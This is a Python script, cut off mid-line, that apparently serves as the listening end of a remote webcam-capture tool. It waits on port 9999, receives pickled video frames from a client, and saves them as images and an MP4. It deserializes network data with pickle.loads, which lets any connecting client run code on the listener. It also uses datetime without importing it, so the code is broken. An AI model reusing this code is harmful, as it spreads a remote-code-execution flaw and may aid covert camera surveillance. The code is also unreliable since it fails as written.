import cv2
import socket
import pickle
import os
import struct
from colorama import Fore, init
from module import banner

# Setting the autoreset True
init(autoreset=True)

# Printing the banner
os.system("clear||cls")
banner.ban()

print(Fore.BLUE + "[*]" + Fore.RESET + " Creating a socket object")
# Create a socket object
server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

# Replace 'SERVER_IP' with the IP address of the server
server_ip = '0.0.0.0'
port = 9999

# bind the server
server_socket.bind((server_ip, port))

# Listen for incoming connections
server_socket.listen(5)

print(Fore.BLUE + "[*]" + Fore.RESET + " Waiting for a client to connect...")

# Accept a client connection
client_socket, addr = server_socket.accept()
print(Fore.BLUE + "[*]" + Fore.RESET + ' Got a connection from ', addr)

# Initialize a variable to store the received frame
data = b""
payload_size = struct.calcsize("Q")

# Create a directory to save the frames
save_dir = "frames"
if not os.path.exists(save_dir):
    os.makedirs(save_dir)

frame_width = 0  # Width of the received frames
frame_height = 0  # Height of the received frames
fps = 25  # Frames per second of the output video
output_video_path = "output_video.mp4"

video_writer = None

while True:
    # Receive data from the client
    while len(data) < payload_size:
        packet = client_socket.recv(4 * 1024)  # Adjust the buffer size as needed
        if not packet:
            break
        data += packet

    # Extract the length of the serialized frame from the received data
    packed_msg_size = data[:payload_size]
    data = data[payload_size:]
    msg_size = struct.unpack("Q", packed_msg_size)[0]

    # Keep receiving data until the entire frame is received
    while len(data) < msg_size:
        data += client_socket.recv(4 * 1024)  # Adjust the buffer size as needed

    # Deserialize the received frame using pickle
    frame_data = data[:msg_size]
    data = data[msg_size:]
    frame = pickle.loads(frame_data)

    # Save the frame as an image with timestamp
    current_time = datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
    save_path = os.path.join(save_dir, f"{current_time}.jpg")
    cv2.imwrite(save_path, frame)
    print("The photo has been saved:", save_path)

    # Initialize the video writer when receiving the first frame
    if video_writer is None:
        frame_height, frame_width, _ = frame.shape
        video_writer = cv2.VideoWriter(output_video_path,
                                       cv2.VideoWriter_fourcc(*"mp4v"),
                                       fps, (frame_width, frame_height))

    # Write the frame to the video file
    video_writer.write(frame)

    if cv2.waitKey(1) == 13:  # Press 'Enter' to exit
        break

# Release resources
cv2.destroyAllWindows()
client_socket.close()
server_socket.close()

# Release the video writer
if video_writer is not None:
    video_writer.release()

# Convert the saved frames to a video
image_files = [os.path
